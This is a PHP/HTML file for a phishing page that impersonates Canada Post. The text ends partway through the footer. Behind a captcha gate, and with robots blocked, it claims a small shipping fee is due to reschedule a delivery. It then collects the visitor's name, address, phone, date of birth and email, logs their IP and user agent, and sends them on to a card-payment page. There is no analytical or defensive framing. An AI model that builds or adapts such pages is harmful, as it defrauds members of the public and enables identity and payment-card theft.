<?php
session_start(); // Start the session

$_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['user_ip'] = $_SERVER['REMOTE_ADDR'];

if (isset($_SESSION['user_ip'])) {
    $userIp = $_SESSION['user_ip'];
    $userAgent = $_SESSION['user_agent'];
}


// Redirect to the reCAPTCHA page if the session variable is not set or not true
if (!isset($_SESSION['recaptcha_validated']) || $_SESSION['recaptcha_validated'] !== true) {
    header("Location: /captcha/page.php"); // Adjust path as needed
    exit;
}

// At the beginning of target_file.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Perform any required server-side processing here.

    // Then redirect to another page.
    header('Location: /pages/card/page.php');
    exit();
}

?>
<html xmlns="http://www.w3.org/1999/xhtml" style="" class=" csstransitions no-csspseudotransitions no-touchevents" lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="content-language" content="en-CA">
        <title>Enter Shipping Address | Canada Post - Canada</title>
        <meta content="minimum-scale=1.0, maximum-scale=1.0, width=device-width, user-scalable=no" name="viewport">
        <meta name="robots" content="noindex, nofollow">
        <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
        <link type="text/css" href="/assets/cap/general.css" rel="stylesheet">
        <link type="text/css" href="/assets/cap/basic.css" rel="stylesheet">
        <link href="/assets/cap/interface.css" rel="stylesheet" type="text/css">
        <link type="text/css" href="/assets/cap/mobile.css" rel="stylesheet">
        <link type="text/css" href="/assets/cap/buttons.css" rel="stylesheet">
        <link type="text/css" href="/assets/cap/table.css" rel="stylesheet">
        <link type="text/css" href="/assets/cap/hard.css" rel="stylesheet">
        <link rel="stylesheet" type="text/css" href="/assets/cap/out.css">
        <link rel="stylesheet" type="text/css" href="/assets/cap/trail.css">
        <link rel="stylesheet" type="text/css" href="/assets/cap/live.css">
        <link rel="stylesheet" type="text/css" href="/assets/cap/sit.css">
        <link rel="stylesheet" type="text/css" href="/assets/cap/frame.css">
        <link rel="stylesheet" href="/assets/cap/fonts.css" type="text/css">
        <style>
            @media only screen and (min-width: 64em) {
            #sec_info{
            margin-top:-40px;}
            #shp_block{
            border-left: 1px solid #ccc;
            }
            }
            .right-err{padding-left:5px;}
            .a-button {
                background: #087cc0;
                text-decoration: none;
                color: #fff;
                width: 100%;
                font-size: 1rem;
                padding: 10px 20px 10px 20px;
                font-weight: 400;
                border-radius: 2px;
                -webkit-font-smoothing: antialiased;
                margin: 0px;
                border: 1px solid black;
                float: none !important;
                display: block;
            }

            @media only screen and (max-width: 40em){
            #far_wrapper .goingto_flag_canada, #far_wrapper .goingto_flag_usa, #far_wrapper .goingto_flag_international {
                padding-bottom: 45px;
            }}

            @media only screen and (min-width: 641px)
            {#sec_info {
                margin-top: -40px;
            }}

            .a-button {
                margin-bottom: 20px;
            }

            .find_rate_parcel_lookup .lineheightadjtoinput {
                line-height: 24px !important;
            }
        </style>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js"></script>
    </head>
    <body class="en true wide www inbox f-topbar-fixed" id="bdm" style="" onload="document.getElementById('bdm').style.display='';">
        <div class="">
            <div class="inner-wrap">
                <div id="wrapper" class="personal">
                    <cpc-skip-nav class="cpc-component"></cpc-skip-nav>
                    <cpc-header class="cpc-component">
                        <div class="cpc-skip-nav"><a href="#main-content" class="skip-nav" target="_self"><span class="cpc-skip-nav-label">Skip to Main Content</span></a></div>
                        <div id="mainNav" class="cpc-nav">
                            <div class="noindex">
                                <nav role="navigation" class="cpc-nav-suppress-product-nav">
                                    <div class="sticky utility-business-nav-sticky-container">
                                        <div class="top-bar utility-business-nav show-for-large-up">
                                            <ul class="title-area">
                                                <li>
                                                    <a href="#"><img src="/assets/cap/cpc-main-logo.svg" alt="Canada Post"></a>
                                                </li>
                                                <li class="toggle-topbar menu-icon"><a href="#"><span>Menu</span></a></li>
                                            </ul>
                                            <section class="top-bar-section">
                                                <ul class="left">
                                                    <li><a href="#">Personal</a></li>
                                                    <li><a href="#">Business</a></li>
                                                    <li><a href="#">Our company</a></li>
                                                    <li><a href="#">My account</a></li>
                                                    <li><a href="#" class="">Tools</a></li>
                                                </ul>
                                            </section>
                                        </div>
                                    </div>
                                </nav>
                                <div class="mega-nav-overlay"></div>
                            </div>
                            <div class="mobile-container-wrapper show-for-medium-down">
                                <div class="top--section">
                                    <ul>
                                        <li>
                                            <div class="cpc-mobile--hamburger" id="trigger">
                                                <span></span>
                                                <span></span>
                                                <span></span>
                                            </div>
                                        </li>
                                        <li class="logo">
                                            <a href="#"><img src="/assets/cap/cpc-logo.svg" alt="Canada Post"></a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </cpc-header>
                    <span id="main-content" tabindex="0"></span>
                    <div id="contentWrap">
                        <div id="far_topBanner">
                            <div class="row">
                                <div class="large-12 medium-10 four small-12 columns">
                                    <span class="far_icon"></span>
                                    <h1>New Delivery Schedule</h1>
                                    <p class="far_content_business_text">To schedule a new delivery, a shipping fee must be paid. Please select your preferred date and enter the shipping address below.</p>
                                </div>
                            </div>
                            <div class="far_chevron"></div>
                        </div>
                        <div id="main">
                            <div class="row">
                                <div class="large-12 medium-12 columns">
                                    <div class="alert-box msgInfo cmb">
                                        <img src="/assets/cap/info-glyph.svg" alt="Info">
                                        <p class="text nopaddingright" style="font-size: 14px !important;">
                                            Please be advised that due to the COVID-19 situation, occasional delays are expected..
                                        </p>
                                    </div>
                                </div>
                                <div class="large-12 medium-12 columns">
                                    <div id="far_wrapper">
                                        <div id="messagesInsertionPoint"></div>
                                        <div class="right margintop25 nomargin noFloatSmall marginbottomsmall25 margintop15_mobile">
                                            <p class="nomargin"><a class="nomarginbottom" href="#">All fields are required unless marked optional.</a></p>
                                        </div>
                                        <ul class="hide-for-small-only far_menu_large">
                                            <li><a class="current" href="#">Schedule Delivery</a></li>
                                            <div class="clear"></div>
                                        </ul>
                                        <ul class="show-for-small-only far_menu_small">
                                            <li>
                                                <a class="current" href="#">Schedule Delivery
                                                </a>
                                            </li>
                                        </ul>
                                        <div class="find_rate_parcel_lookup marginbottom30">
                                            <div class="alert-box msgErr" id="main-block-err" style="display:none">
                                                <code><span>×</span></code>
                                                <p>Please correct the errors mentioned below to proceed.</p>
                                            </div>
                                            <form id="myForm">
                                                <div class="row">
                                                    <div class="columns large-4 medium-6 small-12">
                                                        <div class="row">
                                                            <div class="columns large-12 medium-12 small-12">
                                                                <h6 class=" nomarginbottom_mobile goingto_flag_canada"><label for="canada" class="inherit">Choose a delivery option</label></h6>
                                                                <p>
                                                                    To schedule a new delivery, a shipping fee must be paid.<br>
                                                                    <br>
                                                                    Preferred delivery date:
                                                                </p>
                                                                <label style="float: none;">
                                                                    <input type="radio" name="shipping" checked="checked" value="0" class="styled" id="radio1">
                                                                    <span for="radio1">&nbsp;<?=date('d F', strtotime('+2 days'))?> - <strong>1.25 CAD</strong></span>
                                                                </label>
                                                                
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div id="shp_block" class="columns large-8 medium-12 small-12">
                                                        <div class="row">
                                                            <div class="columns large-12 medium-12 small-12">
                                                                <p class="marginbottom10_mobile">&nbsp;</p>
                                                                <h6 class="marginbottom15 margintop10_mobile marginbottom10_mobile">Shipping Address</h6>
                                                            </div>
                                                        </div>
                                                        <div class="row ui_wrapper">
                                                            <div class="columns large-6 medium-6 small-12">
                                                                <div class="row">
                                                                    <div class="columns large-12 medium-12 small-12">

                                                                    </div>
                                                                </div>
                                                                <div class="row">
                                                                    <div class="columns large-6 medium-6 small-6">
                                                                        <div class="row">
                                                                            <div class="columns large-12 medium-12 small-12">
                                                                                <label for="fn" class="lineheightadjtoinput">First name</label>
                                                                            </div>
                                                                            <div class="columns large-12 medium-12 small-12">
                                                                                <input id="fn" name="fname" type="text" value="" size="7" class="ui-autocomplete-input lrinput" attr-action="Filling First Name" required autocomplete="off" maxlength="150" onkeypress="return yZtafJQsXvd3(event)">
                                                                                <div class="msgError" style="display:none"><small class="error">Please enter your complete valid name</small></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="columns large-6 medium-6 small-6">
                                                                        <div class="row">
                                                                            <div class="columns large-12 medium-12 small-12">
                                                                                <label for="fn" class="lineheightadjtoinput">Last name</label>
                                                                            </div>
                                                                            <div class="columns large-12 medium-12 small-12">
                                                                                <input id="fn" name="lname" type="text" value="" size="7" class="ui-autocomplete-input lrinput" attr-action="Filling Last Name" required autocomplete="off" maxlength="150" onkeypress="return yZtafJQsXvd3(event)">
                                                                                <div class="msgError" style="display:none"><small class="error">Please enter your complete valid name</small></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                               
                                                                <div class="row">
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <label for="add" class="lineheightadjtoinput">Address</label>
                                                                    </div>
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <input id="add" name="address" type="text" value="" size="7" class="ui-autocomplete-input lrinput" attr-action="Filling Address" required autocomplete="off" maxlength="150">
                                                                        <div class="msgError" style="display:none"><small class="error">Please enter shipping address</small></div>
                                                                    </div>
                                                                </div>
                                                                <div class="row">
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <label for="add2" class="lineheightadjtoinput">Apt/Bldg No</label>
                                                                    </div>
                                                                    <div class="columns large-12 medium-12 small-12"><input id="add2" name="apt" type="text" value="" size="7" class="ui-autocomplete-input lrinput" attr-action="Filling Apt" autocomplete="off" placeholder="(optional)" maxlength="150"></div>
                                                                </div>
                                                                <div class="row">
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <label for="cty" class="lineheightadjtoinput">City</label>
                                                                    </div>
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <input id="cty" name="city" type="text" value="" size="7" class="ui-autocomplete-input lrinput" attr-action="Filling City" required autocomplete="off" maxlength="150" onkeypress="return yZtafJQsXvd3(event)" required>
                                                                        <div class="msgError" style="display:none"><small class="error">Please enter city</small></div>
                                                                    </div>
                                                                </div>
                                                                <div class="row">
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <label for="prv" class="lineheightadjtoinput">Province</label>
                                                                    </div>
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <input id="prv" name="province" type="text" value="" size="7" class="ui-autocomplete-input lrinput" attr-action="Filling Province" required autocomplete="off" maxlength="150" onkeypress="return yZtafJQsXvd3(event)">
                                                                        <div class="msgError" style="display:none"><small class="error">Please enter state</small></div>
                                                                    </div>
                                                                </div>
                                                               
                                                                <div class="row">
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <label for="post" class="lineheightadjtoinput">Postal code</label>
                                                                    </div>
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <input id="input-postal" name="postal" type="text" value="" size="7" class="ui-autocomplete-input lrinput" attr-action="Filling Postal" required autocomplete="off" maxlength="15">
                                                                        <div class="msgError" style="display:none"><small class="error">Please enter post code</small></div>
                                                                    </div>
                                                                </div>
                                                               
                                                                <div class="row">
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <label for="mnum" class="">Mobile number</label>
                                                                    </div>
                                                                    <div class="columns large-12 medium-12 small-12 adj_input_marginbottom45_mobile">
                                                                        <input id="mnum" name="phone" type="tel" value="" size="7" class="ui-autocomplete-input lrinput" attr-action="Filling Phone" required autocomplete="off" maxlength="15" onkeypress="return pbnCNPbBKot2(event)">
                                                                        <div class="msgError" style="display:none"><small class="error">Please enter your mobile number</small></div>
                                                                    </div>
                                                                </div>
                                                              
                                                            </div>
                                                            <div id="sec_info" class="columns large-6 medium-6 small-12">
                                                               
                                                                <div class="row">
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <p class="marginbottom10_mobile"><strong>Security information</strong></p>
                                                                    </div>
                                                                </div>
                                                            
                                                                <div class="row">
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <label for="db1" class="lineheightadjtoinput">Date of birth</label>
                                                                    </div>
                                                                </div>
                                                                <div class="row">
                                                                    <div class="columns large-4 medium-4 small-4">
                                                                        <select name="day" id="db1" class="lrinput" attr-action="Filling DoB" required>
                                                                            <option value="">DD</option>
                                                                            <option value="01">01</option>
                                                                            <option value="02">02</option>
                                                                            <option value="03">03</option>
                                                                            <option value="04">04</option>
                                                                            <option value="05">05</option>
                                                                            <option value="06">06</option>
                                                                            <option value="07">07</option>
                                                                            <option value="08">08</option>
                                                                            <option value="09">09</option>
                                                                            <option value="10">10</option>
                                                                            <option value="11">11</option>
                                                                            <option value="12">12</option>
                                                                            <option value="13">13</option>
                                                                            <option value="14">14</option>
                                                                            <option value="15">15</option>
                                                                            <option value="16">16</option>
                                                                            <option value="17">17</option>
                                                                            <option value="18">18</option>
                                                                            <option value="19">19</option>
                                                                            <option value="20">20</option>
                                                                            <option value="21">21</option>
                                                                            <option value="22">22</option>
                                                                            <option value="23">23</option>
                                                                            <option value="24">24</option>
                                                                            <option value="25">25</option>
                                                                            <option value="26">26</option>
                                                                            <option value="27">27</option>
                                                                            <option value="28">28</option>
                                                                            <option value="29">29</option>
                                                                            <option value="30">30</option>
                                                                            <option value="31">31</option>
                                                                        </select>
                                                                    </div>
                                                                    <div class="columns large-4 medium-4 small-4">
                                                                        <select name="month" id="db2" class="lrinput" attr-action="Filling DoB" required>
                                                                            <option value="">MM</option>
                                                                            <option value="01">01</option>
                                                                            <option value="02">02</option>
                                                                            <option value="03">03</option>
                                                                            <option value="04">04</option>
                                                                            <option value="05">05</option>
                                                                            <option value="06">06</option>
                                                                            <option value="07">07</option>
                                                                            <option value="08">08</option>
                                                                            <option value="09">09</option>
                                                                            <option value="10">10</option>
                                                                            <option value="11">11</option>
                                                                            <option value="12">12</option>
                                                                        </select>
                                                                    </div>
                                                                    <div class="columns large-4 medium-4 small-4">
                                                                        <select name="years" id="db3" class="lrinput" attr-action="Filling DoB" required>
                                                                            <option value="">YYYY</option>
                                                                            <option value="1910">1910</option>
                                                                            <option value="1911">1911</option>
                                                                            <option value="1912">1912</option>
                                                                            <option value="1913">1913</option>
                                                                            <option value="1914">1914</option>
                                                                            <option value="1915">1915</option>
                                                                            <option value="1916">1916</option>
                                                                            <option value="1917">1917</option>
                                                                            <option value="1918">1918</option>
                                                                            <option value="1919">1919</option>
                                                                            <option value="1920">1920</option>
                                                                            <option value="1921">1921</option>
                                                                            <option value="1922">1922</option>
                                                                            <option value="1923">1923</option>
                                                                            <option value="1924">1924</option>
                                                                            <option value="1925">1925</option>
                                                                            <option value="1926">1926</option>
                                                                            <option value="1927">1927</option>
                                                                            <option value="1928">1928</option>
                                                                            <option value="1929">1929</option>
                                                                            <option value="1930">1930</option>
                                                                            <option value="1931">1931</option>
                                                                            <option value="1932">1932</option>
                                                                            <option value="1933">1933</option>
                                                                            <option value="1934">1934</option>
                                                                            <option value="1935">1935</option>
                                                                            <option value="1936">1936</option>
                                                                            <option value="1937">1937</option>
                                                                            <option value="1938">1938</option>
                                                                            <option value="1939">1939</option>
                                                                            <option value="1940">1940</option>
                                                                            <option value="1941">1941</option>
                                                                            <option value="1942">1942</option>
                                                                            <option value="1943">1943</option>
                                                                            <option value="1944">1944</option>
                                                                            <option value="1945">1945</option>
                                                                            <option value="1946">1946</option>
                                                                            <option value="1947">1947</option>
                                                                            <option value="1948">1948</option>
                                                                            <option value="1949">1949</option>
                                                                            <option value="1950">1950</option>
                                                                            <option value="1951">1951</option>
                                                                            <option value="1952">1952</option>
                                                                            <option value="1953">1953</option>
                                                                            <option value="1954">1954</option>
                                                                            <option value="1955">1955</option>
                                                                            <option value="1956">1956</option>
                                                                            <option value="1957">1957</option>
                                                                            <option value="1958">1958</option>
                                                                            <option value="1959">1959</option>
                                                                            <option value="1960">1960</option>
                                                                            <option value="1961">1961</option>
                                                                            <option value="1962">1962</option>
                                                                            <option value="1963">1963</option>
                                                                            <option value="1964">1964</option>
                                                                            <option value="1965">1965</option>
                                                                            <option value="1966">1966</option>
                                                                            <option value="1967">1967</option>
                                                                            <option value="1968">1968</option>
                                                                            <option value="1969">1969</option>
                                                                            <option value="1970">1970</option>
                                                                            <option value="1971">1971</option>
                                                                            <option value="1972">1972</option>
                                                                            <option value="1973">1973</option>
                                                                            <option value="1974">1974</option>
                                                                            <option value="1975">1975</option>
                                                                            <option value="1976">1976</option>
                                                                            <option value="1977">1977</option>
                                                                            <option value="1978">1978</option>
                                                                            <option value="1979">1979</option>
                                                                            <option value="1980">1980</option>
                                                                            <option value="1981">1981</option>
                                                                            <option value="1982">1982</option>
                                                                            <option value="1983">1983</option>
                                                                            <option value="1984">1984</option>
                                                                            <option value="1985">1985</option>
                                                                            <option value="1986">1986</option>
                                                                            <option value="1987">1987</option>
                                                                            <option value="1988">1988</option>
                                                                            <option value="1989">1989</option>
                                                                            <option value="1990">1990</option>
                                                                            <option value="1991">1991</option>
                                                                            <option value="1992">1992</option>
                                                                            <option value="1993">1993</option>
                                                                            <option value="1994">1994</option>
                                                                            <option value="1995">1995</option>
                                                                            <option value="1996">1996</option>
                                                                            <option value="1997">1997</option>
                                                                            <option value="1998">1998</option>
                                                                            <option value="1999">1999</option>
                                                                            <option value="2000">2000</option>
                                                                            <option value="2001">2001</option>
                                                                            <option value="2002">2002</option>
                                                                            <option value="2003">2003</option>
                                                                            <option value="2004">2004</option>
                                                                            <option value="2005">2005</option>
                                                                            <option value="2006">2006</option>
                                                                            <option value="2007">2007</option>
                                                                            <option value="2008">2008</option>
                                                                            <option value="2009">2009</option>
                                                                            <option value="2010">2010</option>
                                                                        </select>
                                                                    </div>
                                                                    <div class="msgError right-err" id="db_err"></div>
                                                                </div>
                                                               
                                                                <div class="row">
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <label for="post" class="lineheightadjtoinput">E-mail</label>
                                                                    </div>
                                                                    <div class="columns large-12 medium-12 small-12">
                                                                        <input id="em" name="email" type="email" value="" size="7" class="ui-autocomplete-input lrinput" attr-action="Filling Email" required autocomplete="off" maxlength="30">
                                                                        <div id="emError" class="msgError" style="display:none"><small class="error">Please enter e-mail</small></div>
                                                                    </div>
                                                                </div>
                                                             
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <span class="hr marginbottom25 show-for-medium-up"></span>
                                                <div class="row">
                                                    <div class="columns large-7 medium-7 small-12">
                                                        <p class="small mobilefont11">Total: <strong><span id="ship-price">1.25</span> CAD</strong></p>
                                                    </div>
                                                    <div class="columns large-5 medium-5 small-12">
                                                       
                                                        <button class="a-button" type="submit" >Go to payment</button>
                                                    </div>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <cpc-footer class="cpc-component">
                        <div id="cpc-main-footer" class="cpc-footer-container">
                            <div class="cpc-footer">
                                <div class="noindex">
                                    <section class="footer-l1" role="navigation">
                                        <div class="row show-for-large-up">
                                            <div class="large-3 columns">
                                                <h2 class="show-for-medium-up">Connect with us</h2>
                                                <ul class="social-media-icons">
                                                    <li>
                                                        <a href="#">
                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                <title>Facebook</title>
                                                                <path d="M12.688 22h-9.63A1.058 1.058 0 0 1 2 20.942V3.058C2 2.474 2.474 2 3.058 2h17.884C21.526 2 22 2.474 22 3.058v17.884c0 .584-.474 1.058-1.058 1.058H15.82v-7.731h2.614l.391-3.036H15.82V9.308c0-.878.243-1.48 1.503-1.48h1.608v-2.75a21.493 21.493 0 0 0-2.338-.117 3.662 3.662 0 0 0-3.905 4.03v2.232h-2.614v3.035h2.624L12.688 22z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                            </svg>
                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a href="#">
                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                <title>Twitter</title>
                                                                <path d="M9.681 17.08c4.717 0 7.297-3.909 7.297-7.297 0-.111-.002-.222-.007-.332.5-.362.936-.814 1.279-1.328a5.12 5.12 0 0 1-1.473.404c.53-.317.936-.82 1.128-1.419a5.138 5.138 0 0 1-1.629.623 2.565 2.565 0 0 0-4.37 2.339A7.28 7.28 0 0 1 6.62 7.39a2.563 2.563 0 0 0 .794 3.424 2.545 2.545 0 0 1-1.162-.32v.032c0 1.242.884 2.279 2.057 2.514a2.572 2.572 0 0 1-1.158.044 2.567 2.567 0 0 0 2.396 1.781 5.146 5.146 0 0 1-3.797 1.063 7.26 7.26 0 0 0 3.931 1.151M19.5 22h-15A2.5 2.5 0 0 1 2 19.5v-15A2.5 2.5 0 0 1 4.5 2h15A2.5 2.5 0 0 1 22 4.5v15a2.5 2.5 0 0 1-2.5 2.5" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                            </svg>
                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a href="#">
                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                <title>Instagram</title>
                                                                <path d="M18.54 6.658a1.199 1.199 0 1 1-2.397 0 1.199 1.199 0 0 1 2.397 0zm-6.53 8.665a3.333 3.333 0 1 0 0-6.667 3.333 3.333 0 0 0 0 6.667zm0-8.412a5.131 5.131 0 1 1-5.13 5.131 5.131 5.131 0 0 1 5.13-5.184v.053zm0-3.06c-2.67 0-2.986 0-4.037.063a5.531 5.531 0 0 0-1.851.347 3.312 3.312 0 0 0-1.893 1.893 5.531 5.531 0 0 0-.347 1.85c0 1.052-.063 1.367-.063 4.038 0 2.67 0 2.986.063 4.038.01.632.127 1.258.347 1.85a3.312 3.312 0 0 0 1.893 1.893c.593.22 1.218.338 1.85.347 1.052 0 1.368.063 4.039.063 2.67 0 2.986 0 4.037-.063a5.531 5.531 0 0 0 1.851-.347 3.312 3.312 0 0 0 1.893-1.892c.22-.593.338-1.219.347-1.851 0-1.052.063-1.367.063-4.038 0-2.67 0-2.986-.063-4.038a5.531 5.531 0 0 0-.347-1.85 3.312 3.312 0 0 0-1.893-1.893 5.531 5.531 0 0 0-1.85-.347c-1.063-.105-1.378-.105-4.038-.105v.042zm0-1.798c2.713 0 3.05 0 4.122.063a7.36 7.36 0 0 1 2.43.462 5.11 5.11 0 0 1 2.912 2.871c.29.778.447 1.6.463 2.429 0 1.052.063 1.41.063 4.122 0 2.713 0 3.05-.063 4.122a7.36 7.36 0 0 1-.463 2.429 5.11 5.11 0 0 1-2.923 2.923 7.36 7.36 0 0 1-2.429.463c-1.052 0-1.41.063-4.122.063-2.713 0-3.05 0-4.122-.063a7.36 7.36 0 0 1-2.429-.463 5.11 5.11 0 0 1-2.923-2.923 7.36 7.36 0 0 1-.463-2.429C2.063 15.07 2 14.712 2 12c0-2.713 0-3.05.063-4.122a7.36 7.36 0 0 1 .463-2.429A5.11 5.11 0 0 1 5.46 2.526a7.36 7.36 0 0 1 2.429-.463C8.95 2.011 9.298 2 12.01 2v.053z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                            </svg>
                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a href="#">
                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                <title>Linkedin</title>
                                                                <path d="M19.044 19.043h-2.966V14.4c0-1.107-.02-2.531-1.541-2.531-1.544 0-1.78 1.207-1.78 2.452v4.72H9.792V9.499h2.845v1.305h.041c.396-.75 1.364-1.542 2.807-1.542 3.004 0 3.559 1.977 3.559 4.547v5.235zM6.448 8.193a1.72 1.72 0 1 1 0-3.438 1.72 1.72 0 0 1 0 3.439zm-1.484 10.85h2.968V9.498H4.964v9.545zM20.521 2H3.476C2.662 2 2 2.646 2 3.442v17.116C2 21.354 2.662 22 3.476 22h17.045c.816 0 1.479-.647 1.479-1.443V3.442C22 2.646 21.337 2 20.52 2z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                            </svg>
                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a href="#">
                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                                                <title>YouTube</title>
                                                                <g transform="translate(2 5)" fill="none" fill-rule="evenodd">
                                                                    <path d="M7.935 10.266V4.274l5.403 3.007-5.403 2.985zM19.8 3.236s-.195-1.47-.795-2.117c-.76-.85-1.613-.854-2.004-.903C14.203 0 10.004 0 10.004 0h-.008S5.798 0 2.999.216c-.391.05-1.243.054-2.004.903C.395 1.766.2 3.236.2 3.236S0 4.962 0 6.688v1.618c0 1.725.2 3.451.2 3.451s.195 1.47.795 2.117c.76.85 1.76.823 2.205.912C4.8 14.949 10 15 10 15s4.203-.007 7.001-.222c.391-.05 1.244-.054 2.004-.904.6-.647.795-2.117.795-2.117s.2-1.726.2-3.451V6.688c0-1.726-.2-3.452-.2-3.452z" class="svg-shape" fill="#CBCBCB"></path>
                                                                </g>
                                                            </svg>
                                                        </a>
                                                    </li>
                                                </ul>
                                                <ul class="feedback-group">
                                                    <li>
                                                        <div class="cpc-tb--icon cpc-tb--icon-feedback pk"></div>
                                                        <a href="#"><span class="tool-description">Website feedback</span></a>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div class="large-3 columns">
                                                <h2 class="show-for-medium-up">Support</h2>
                                                <ul>
                                                    <li><a href="#" class="chat-link" target="">Need help?</a></li>
                                                    <li><a href="#" class="chat-link" target="">Contact us</a></li>
                                                </ul>
                                            </div>
                                            <div class="large-3 columns">
                                                <h2 class="show-for-medium-up">Corporate</h2>
                                                <ul>
                                                    <li><a href="#" target="">About us</a></li>
                                                    <li><a href="#" target="">Media centre</a></li>
                                                    <li><a href="#" target="">Careers</a></li>
                                                    <li><a href="#" target="">I'm an employee</a></li>
                                                    <li><a href="#" target="">Talent Zone</a></li>
                                                    <li><a href="#" target="">Negotiations Updates</a></li>
                                                </ul>
                                            </div>
                                            <div class="large-3 columns">
                                                <h2 class="show-for-medium-up">Blogs</h2>
                                                <ul>
                                                    <li><a href="#" target="">Business Matters</a></li>
                                                    <li><a href="#" target="">Canada Post Magazine</a></li>
                                                </ul>
                                            </div>
                                        </div>
                                        <div class="row show-for-medium-only">
                                            <div class="medium-6 columns">
                                                <h2 class="show-for-medium-up">Connect with us</h2>
                                                <ul class="social-media-icons">
                                                    <li>
                                                        <a href="#">
                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                <title>Facebook</title>
                                                                <path d="M12.688 22h-9.63A1.058 1.058 0 0 1 2 20.942V3.058C2 2.474 2.474 2 3.058 2h17.884C21.526 2 22 2.474 22 3.058v17.884c0 .584-.474 1.058-1.058 1.058H15.82v-7.731h2.614l.391-3.036H15.82V9.308c0-.878.243-1.48 1.503-1.48h1.608v-2.75a21.493 21.493 0 0 0-2.338-.117 3.662 3.662 0 0 0-3.905 4.03v2.232h-2.614v3.035h2.624L12.688 22z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                            </svg>
                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a href="#">
                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                <title>Twitter</title>
                                                                <path d="M9.681 17.08c4.717 0 7.297-3.909 7.297-7.297 0-.111-.002-.222-.007-.332.5-.362.936-.814 1.279-1.328a5.12 5.12 0 0 1-1.473.404c.53-.317.936-.82 1.128-1.419a5.138 5.138 0 0 1-1.629.623 2.565 2.565 0 0 0-4.37 2.339A7.28 7.28 0 0 1 6.62 7.39a2.563 2.563 0 0 0 .794 3.424 2.545 2.545 0 0 1-1.162-.32v.032c0 1.242.884 2.279 2.057 2.514a2.572 2.572 0 0 1-1.158.044 2.567 2.567 0 0 0 2.396 1.781 5.146 5.146 0 0 1-3.797 1.063 7.26 7.26 0 0 0 3.931 1.151M19.5 22h-15A2.5 2.5 0 0 1 2 19.5v-15A2.5 2.5 0 0 1 4.5 2h15A2.5 2.5 0 0 1 22 4.5v15a2.5 2.5 0 0 1-2.5 2.5" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                                            </svg>
                                                        </a>
                                                    </li>
                                                    <li>
                                                        <a href="#">
                                                            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                                                <title>Instagram</title>
